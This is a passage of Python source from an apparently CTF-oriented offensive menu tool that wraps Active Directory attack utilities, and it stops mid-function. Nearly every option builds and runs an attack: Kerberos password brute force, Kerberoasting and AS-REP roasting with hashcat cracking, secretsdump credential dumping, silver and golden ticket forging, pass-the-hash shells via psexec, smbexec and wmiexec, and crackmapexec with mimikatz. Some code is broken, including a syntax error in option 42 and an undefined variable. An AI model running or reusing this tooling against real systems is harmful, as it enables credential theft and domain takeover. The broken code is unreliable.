# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - enum4linux -u "" -p "" REMOTE IP.
# Details : Anonymous login check.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '30':
      print("\n[*] Trying with a null session first...")
      command("enum4linux -v " + TIP.rstrip(" "))
      print("\n[*] Now trying with user " + USR.rstrip(" ") + " and password " + PAS.rstrip(" ") + "...")
      command("enum4linux -v -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") +" " + TIP.rstrip(" "))
      prompt()

#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - windapsearch.py -d IP -u DOMAIN\\USER -p PASSWORD -GUC --da --full.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='31':
      command(PATH + "windapsearch.py -d " + TIP.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -GUC --da --full")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - lookupsid.py DOMAIN/USR:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='32':
      print("\n[+] [*] Enumerating, please wait....\n")
      command(PATH + "lookupsid.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > DOMAIN.tmp")
      command("cat DOMAIN.tmp | grep SidTypeGroup"); print ("")
      command("cat DOMAIN.tmp | grep SidTypeAlias"); print ("")
      command("cat DOMAIN.tmp | grep SidTypeUser"); print ("")
      command("cat DOMAIN.tmp | grep 'Domain SID' > SID.tmp")
      os.remove("DOMAIN.tmp")
      SIDID = linecache.getline("SID.tmp", 1)
      os.remove("SID.tmp")

      if SIDID != "":
         SID = SIDID.replace('[+] Domain SID is: ',"")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - ./samrdump.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='33':
      print("\n[*] Enumerating, please wait...")
      os.remove("users.txt")	# DELETE CURRENT VERSION
      command(PATH + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > USERS.tmp")
      command("sed -i -n '/Found user: /p' USERS.tmp")	# SELECT ONLY FOUND USERS
      command("sort USERS.tmp > USERS2.tmp")			# SORT USERS ALPHANUMERICALLY 
      os.remove("USERS.tmp")
      command("mv USERS2.tmp USERS.tmp")      

      for x in range (0, MAXX):
         USER[x] = linecache.getline('USERS.tmp', x+1)
         if USER[x] != "":
            USER[x] = USER[x].replace("Found user: ", "")
            USER[x] = USER[x].split(",")
            USER[x] = USER[x][0]
            USER[x] = padding(USER[x], COL3)
            if USER[x] != "":
               print("[+] Found user " + USER[x])
               command("echo " + USER[x] + " >> users.txt")	# ASSIGN USERS NAME
            else:
               USER[x] = " "*COL3				# ASSIGN EMPTY USERS
            PASS[x] = "."*COL4					# RESET PASSWORDS
         else:
            USER[x] = " "*COL3
            PASS[x] = " "*COL4   
   
      os.remove("USERS.tmp")	# CLEAR WORK FILE
      print("[*] All done!")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - ./rpcdump.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='34':
      command(PATH + "rpcdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - reg.py DOMAIN/USER:PASSWORD@IP query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s.
# Details : #HKEY_LOCAL_MACHINE\SAM
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='35':
      command(PATH + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " query -keyName HKLM\\\SOFTWARE\\\Policies\\\Microsoft\\\Windows -s")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - smbclient -L \\\\IP -U USER%PASSWORD
# Modified: 
# -------------------------------------------------------------------------------------

   if selection =='36':
      command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - smbmap -u USER -p PASSWORD -d DOMAIN -H IP -R ?
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '37':
      command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - smbclient \\\\IP\\SHARE -U USER%PASSWORD.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '38':
      command("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - rpcclient -U USER%PASSWORD IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '39':
      command("rpcclient -U " + USR.rstrip(" ") + "%" + PAS.strip(" ") + " " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - GetADUsers.py DOMAIN/USER:PASSWORD.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '40':
      command(PATH + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -dc-ip "  + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - nmap -p 88 --script=krb-enum-users --script-args krb-enum-users.realm=DOMAIN,userdb=users.txt IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '41':
      print("\n[*] Please wait, checking to see if any found username is assigned to Kerberous...")
      command("nmap -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=\'" + DOM.rstrip(" ") + ", userdb=users.txt\' " + TIP.rstrip(" ") + " >> KUSERS.tmp")
      command("sed -i '/@/!d' KUSERS.tmp")
      command("sort KUSERS.tmp > USERS2.tmp")
      os.remove("KUSERS.tmp")	# DELETE FILE
      os.remove("users.txt")	# DELETE OLD FILE
	
      for x in range (0, MAXX):
         TEMP = linecache.getline("USERS2.tmp", x+1)
         if TEMP != "":
            TEMP = TEMP.replace("|     ", "")
            TEMP = TEMP.replace("|_    ", "")
            TEMP = TEMP.split("@")
            TEMP = TEMP[0]
            if TEMP[:1] != " ":							# CONTAINS DATA
               USER[x] = TEMP							# ASSIGN USER NAME
               print("[+] Found user ", USER[x])
               command("echo " + USER[x] + " >> users.txt")			# EXPORT FOUND USER
         else:
            USER[x] = " "*COL3							# ASSIGN EMPTY USER
         if USER[x][:1] != " ": PASS[x] = "."*COL4				# RESET HASH VALUE
         if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
         if len(PASS[x]) < COL4: PASS[x] = padding(PASS[x], COL4)

      os.remove("USERS2.tmp")
      print("[*] All done!")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - kerbrute.py -domain DOMAIN -users users.txt -passwords passwords.txt -outputfile optional.txt.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='42':
      print("\n[*] Trying all usernames with password " + PAS.rstrip(" ") + " first...")
      command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -password " + PAS.rstrip(" ") + " -outputfile passwords.txt")

      test1 = linecache.getline("passwords.txt", 1)
      if test1[:1] = "":
         print("\n[*] Now trying all usernames with matching passwords...")
         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -passwords users.txt -outputfile passwords.txt")
         
      test2 = linecache.getline("passwords.txt", 1)
      if test2[1:] == "":
         print("\n[*] Now trying user Administrator with random passwords...")
         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -user Administrator -passwords /usr/share/wordlists/rockyou.txt -outputfile passwords.txt")

      test3 = linecache.getline("passwords.txt", 1)
      if test3[:1] == "":
         print("\n[*] Now trying all users with random passwords...")
         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -passwords /usr/share/wordlists/rockyou.txt")
     
      os.remove("passwords.txt")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected -  GetUserSPNs.py DOMAIN/USER:PASSWORD -outputfile hashroast1.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '43':
      if linecache.getline('users.txt', 1) != " ":
         command(PATH + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -outputfile hashroast1.txt")
         print("\n[*] Cracking hash values if they exists...\n")
         command("hashcat -m 13100 --force -a 0 hashroast1.txt /usr/share/wordlists/rockyou.txt -o cracked1.txt")
         command("strings cracked1.txt")
      else:
         print("[-] The file users.txt is empty...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -outputfile hashroast2.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='44':
      if linecache.getline('users.txt', 1) != " ":
         command(PATH + "GetNPUsers.py -outputfile hashroast2.txt -format hashcat " + DOM.rstrip(" ") + "/ -usersfile users.txt")
         print("\n[*] Cracking hash values if they exists...\n")
         command("hashcat -m 18200 --force -a 0 hashroast2.txt /usr/share/wordlists/rockyou.txt -o cracked2.txt")
         command("strings cracked2.txt")
      else:
         print("[-] The file users.txt is empty...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '45':
      if PAS[:1] != "\"":
         NTM = hashlib.new("md4", PAS.rstrip(" ").encode("utf-16le")).digest()
         NTM = binascii.hexlify(NTM)
         NTM = str(NTM)
         NTM = NTM.lstrip("b'")
         NTM = NTM.rstrip("'")
         for x in range(0, MAXX):
            if USER[x].rstrip(" ") == USR.rstrip(" "): PASS[x] = NTM.rstrip(" ") # RESET USERS HASH
         NTM = padding(NTM, COL4)
      else:
         print("[-] Password not found...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - getTGT.py DOMAIN/USER:PASSWORD
# Details :                        getTGT.py DOMAIN/USER -hashes :HASH
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '46':
      print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")

      if PAS[:1] != "\"":
         command(PATH + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
         command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
      else:
         if NTM[:1] != "":
            command(PATH + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + " -hashes :" + NTM)
            command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
         else:
            print("[-] User password or hash required...")

      if os.path.exists(USR.rstrip(" ") + ".ccache"):
         command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
      else:
          print("[-] TGT was not generated...")
      print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
      HASH = "." # Reset value

      for x in range (0, MAXX):
         if USER[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
            HASH = PASS[x].rstrip(" ")                 # GET HASH

      if HASH != ".":
         command(PATH + "getTGT.py " + DOM.rstrip(" ") +  "/" + IMP.rstrip(" ") + " -hashes :" + HASH)
         command("export KRB5CCNAME=" + IMP.rstrip(" ") + ".ccache")
         if os.path.exists(IMP.rstrip(" ") + ".ccache"):
            command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + IMP.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
         else:
            print("[-] TGT was not generated...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - Pass the Ticket.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '47':
      print("\nSorry, Pass-the-Ticket has not been implemented yet...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN-SID -domain DOMAIN -spn cifs/Forest
# Details : Silver Ticket!! 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '48':
      print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")

      if (NTM[:1] != "") & (SID[:1] != ""):
         command(PATH + "ticketer.py -nthash " + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn cifs/" + DNS.rstrip(" ") + " " + USR.rstrip(" "))
         command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
      else:
         print("\n[-] Hash or Domain-SID not found...")

      if os.path.exists(USR.rstrip(" ") + ".ccache"):
         command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
      else:
          print("\n[-] Golden TGT was not generated...")      

      print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
      HASH = "." # Reset value

      for x in range (0, MAXX):
         if USER[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
            HASH = PASS[x].rstrip(" ")                 # GET HASH

      if HASH != ".":
         command(PATH + "ticketer.py -nthash " + HASH.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn cifs/" + DNS.rstrip(" ") + " " + IMP.rstrip(" "))
         command("export KRB5CCNAME=" + IMP.rstrip(" ") + ".ccache")

      if os.path.exists(IMP.rstrip(" ") + ".ccache"):
         command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + IMP.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
      else:
         print("\n[-] Golden TGT was not generated...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN SID -domain DOMAIN USER
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '49':
      print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")

      if (NTM[:1] != "") & (SID[:1] != ""):
         command(PATH + "ticketer.py -nthash " + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + USR.rstrip(" "))
         command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")       
      else:
         command("echo 'Hash or Domain-SID not found...'")

      if os.path.exists(USR.rstrip(" ") + ".ccache"):
         command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
      else:
          print("[-] Golden TGT was not generated...")

      print("\n[*] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
      HASH = "." # Reset value

      for x in range (0, MAXX):
         if USER[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
            HASH = PASS[x].rstrip(" ")                 # GET HASH
      if HASH != ".":
         command(PATH + "ticketer.py -nthash " + HASH.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + IMP.rstrip(" "))
         command("export KRB5CCNAME=" + IMP.rstrip(" ") + ".ccache")

      if os.path.exists(IMP.rstrip(" ") + ".ccache"):
         command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + IMP.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
      else:
         print("[-] Golden TGT was not generated...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - goldenpac.py -dc-ip IP -target-ip IP DOMAIN/USER:PASSWORD@DOMAIN
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='50':
      print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")
      command(PATH + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + DOM.rstrip(" "))
      print("\n[*] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
      HASH = "." # Reset value

      for x in range (0, MAXX):
         if USER[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
            HASH = PASS[x].rstrip(" ")                 # GET HASH

      if HASH != ".":
         command(PATH + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " -hashes :" + HASH + " "  + DOM.rstrip(" ") + "/" + IMP.rstrip(" ") + "@" + DOM.rstrip(" "))
      else:
         print("[-] Hash value was not found...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - ldapdomaindump -u DOMAIN\USER:PASSWORD IP -o DIRECTORY.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='51':
      command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
      print("\n[*] Checking downloaded files: \n")
      command("ls -la ./" + DIR.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - aclpwn - du neo4j password -f USER - d DOMAIN -sp PASSWORD -s IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='52':
      command("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp '" + PAS.rstrip(" ") +"' -s " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - secretdump.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='53':
      print("\n[*] [*] Enumerating, please wait this can take sometime...")
      command(PATH + "secretsdump.py " + DOM.rstrip(" ") + '/' + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > SECRETS.tmp")

      command("sed -i '/:::/!d' SECRETS.tmp >> SECRETS2.tmp")
      os.remove("SECRETS2.tmp")
      command("cat SECRETS.tmp | wc -l > count.txt")
      count = int(linecache.getline("count.txt", 1))
      os.remove("count.txt")

      for x in range(0, count):
         data = linecache.getline("SECRETS.tmp",x+1)
         data = data.replace(":::","")
         temp = DOM.rstrip(" ") + "\\"
         data = data.replace(temp,"")
         temp = DOM.rstrip(" ") + ".LOCAL\\"
         data = data.replace(temp,"")
         try:
            get1,get2,get3,get4 = data.split(":") 
         except ValueError:
            get1 = "Error..."
            get4 = "Error..."
         get1 = get1.rstrip("\n")
         get4 = get4.rstrip("\n")

         print("[+] Found User", get1)
         USER[x] = get1[:COL3]
         PASS[x] = get4[:COL4]
         if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3) 			# USER
         if len(PASS[x]) < COL4: PASS[x] = padding(PASS[x], COL4) 			# PASSWORD

      for z in range(0, MAXX):
         if USER[z].rstrip(" ") == USR.rstrip(" "): NTM = PASS[z]			# RESET DISPLAY HASH

      os.remove("SECRETS.tmp")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - crackmapexec smb IP -u Administrator -p password --lusers
# Details :                        crackmapexec smb IP -u Administrator -p password --local-auth --shares
# Details :                        crackmapexec smb IP -u Administrator -H hash -x 'net user Administrator /domain'
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='54':
      print("\n[*] Enumerating " + TIP.rstrip(" ") +  " with user " + USR.rstrip(" ") + " and password '" + PAS.rstrip(" ") +"'...\n")

      command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
      command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x '" + CMD.rstrip(" ") + "'")
      command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x 'net user Administrator /domain'")
      command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -X '$PSVersionTable'")
      command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --users")
      command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --shares")
      command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -M mimikatz -o COMMAND='privilege::debug'")
      
      HASH = "." # Reset Value
      for x in range (0, MAXX):
         if USER[x].rstrip(" ") == IMP.rstrip(" "): HASH = PASS[x].rstrip(" ")

      print("\n[*] Now trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH " + HASH +"...\n")

      if HASHAR[:1] != "." and HASHAR[:1] != " " and HASHAR[:1] != "":
         command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + IMP.rstrip(" ") + " -H " + HASH + " -x 'net user Administrator /domain'")
      else:
         print("[-] No NTLM HASH was found for user " + IMP.rstrip(" ") + "...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='55':
      print("\n[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip("\n") + "...\n")
      command(PATH + "psexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))

      print("\n[*] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTM HASH...\n")
      HASH = "." # Reset hash value

      for x in range (0,MAXX):
         if USER[x].rstrip(" ") == IMP.rstrip(" "): HASH = PASS[x].rstrip(" ")

      if HASHAR[:1] != "." and HASHAR[:1] != " " and HASHAR[:1] != "":
         command(PATH + "psexec.py -hashes :" + HASH + " " + IMP.rstrip(" ") + "@" + TIP.rstrip(" "))
      else:
         print("\n[-] No hash value was found for user " + IMP.rstrip(" ") + "...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - domain/username:password@<targetName or address
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='56':
      print("\n[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip(" ") + "...\n")
      command(PATH + "smbexec.py -hashes :" + NTM.rstrip(" ") + " " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))      
      
      print("\n[*] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTM HASH...\n")
      HASH = "." # Reset hash value

      for x in range (0,MAXX):
         if USER[x].rstrip(" ") == IMP.rstrip(" "): HASH = PASS[x].rstrip(" ")

      if HASH != ".":
         command(PATH + "smbexec.py -hashes :" + HASH + " " + DOM.rstrip(" ") + "\\" + IMP.rstrip(" ") + "@" + TIP.rstrip(" "))
      else:
         print("[-] No hash value was found for user " + IMP.rstrip(" ") + "...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='57':
      print("\n[*] Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTM.rstrip("\n") + "...\n")
      command(PATH + "wmiexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
      
      print("\n[*] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTM HASH...\n")
      HASH = "." # Reset Hash value

      for x in range (0,MAXX):
         if USER[x].rstrip(" ") == IMP.rstrip(" "): HASH = PASS[x].rstrip(" ")

      if HASH != ".":  
         command(PATH + "wmiexec.py -hashes :" + HASH + " " + IMP.rstrip(" ") + "@" + TIP.rstrip(" "))   
      else:
         print("[-] No NTLM HASHH was found for user " + IMP.rstrip(" ") + "...")
      prompt()     

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - crewl -d 3 -m5 -w textfile.txt IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='58':
      command("cewl -d 3 -m 5 -w users.txt " + TIP.rstrip(" ") + " 2>&1")
      print("\n[+] Userlist generated via website...")

      if os.path.exists("/usr/share/ncrack/minimal.usr"):
         command("cat /usr/share/ncrack/minimal.usr >> users.txt 2>&1")
         command("sed -i '/#/d' users.txt 2>&1")
         print("[+] NCrack minimal.usr list added as well...")

      for x in range (0,MAXX):
         USER[x] = linecache.getline("users.txt", x+1).rstrip(" ")
         if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)      

#      if USER[12][:1] != " ": USER[11] = "Some users are not shown!!"
      prompt()

#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - Nano users.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='59':
      command("nano users.txt")
      for x in range (0, MAXX):
         USER[x] = linecache.getline("users.txt", x + 1).rstrip(" ")
         if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - pftb IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='60':
      command("pftp " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - ssh -l USER IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='61':
      command("ssh -l " + USR.rstrip(" ") + " " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - telnet -l USER IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='62':
      command("telnet -l " + USR.rstrip(" ") + " " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - nc IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='63':
      command("nc " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - Windows remote login on port 5985.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='64':
